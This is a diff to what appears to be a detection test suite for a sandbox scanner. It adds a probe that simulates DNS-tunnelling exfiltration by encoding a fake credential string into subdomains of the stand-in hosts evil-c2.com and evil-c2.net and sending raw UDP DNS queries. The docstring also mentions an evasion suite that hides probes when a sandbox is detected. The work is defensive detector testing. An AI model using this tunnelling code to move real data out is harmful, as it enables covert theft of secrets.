@@ -983,6 +983,50 @@ def d4_deferred_execution():
 # ====================================================================
 
 
+def d4b_raw_dns_tunnel_high_entropy():
+    """[DETECT — MEASURED] high-entropy DNS query via raw UDP socket.
+
+    Companion to d2 that unblocks live verification of the existing
+    dns_tunneling MEDIUM rule for the raw-socket attack path.
+
+    Group A's a5_dns_tunnel exercises the same mechanism but sits
+    behind the _is_kojuto_sandbox suppression gate, so under kojuto
+    it never fires — the evasion suite deliberately hides Group A
+    when sandbox detection succeeds. Group D runs unconditionally
+    (bypasses the _run guard), so placing a raw-socket high-entropy
+    query here gives kojuto a live-observable dns_tunneling case
+    per import phase.
+
+    Two rounds intentional: dns_tunneling is MEDIUM severity, so a
+    single event stays under the verdict-flip threshold. Two events
+    per import (across 3 imports = 6 total) always crosses the
+    MEDIUM 2+ threshold.
+
+    Motivating regression: the strace \\f escape bug (fixed in the
+    same PR that introduced this probe) silently broke DNS query
+    extraction on raw-socket DNS packets, and there was no
+    unconditional live probe to catch it. This probe closes that
+    coverage gap.
+    """
+    encoded = base64.b64encode(b"stolen_creds_XYZ42").decode().rstrip("=")
+    for suffix in ("evil-c2.com", "evil-c2.net"):
+        try:
+            domain = f"{encoded}.x.{suffix}"
+            labels = domain.split(".")
+            qname = b""
+            for label in labels:
+                qname += struct.pack("B", len(label)) + label.encode()
+            qname += b"\x00"
+            header = struct.pack(">HHHHHH", 0xDDDD, 0x0100, 1, 0, 0, 0)
+            query = header + qname + struct.pack(">HH", 1, 1)
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            sock.settimeout(0.5)
+            sock.sendto(query, ("8.8.8.8", 53))
+            sock.close()
+        except Exception:
+            continue
+
+
 def d5_deferred_persistence_traced():
     """[DETECT — MEASURED] setsid + delay + persistence write.
 
@@ -1033,6 +1077,7 @@ def _run_group_d():
     d2_dga_low_entropy_multi()
     d3_doh_unlisted_provider()
     d4_deferred_execution()
+    d4b_raw_dns_tunnel_high_entropy()
     d5_deferred_persistence_traced()
 
 
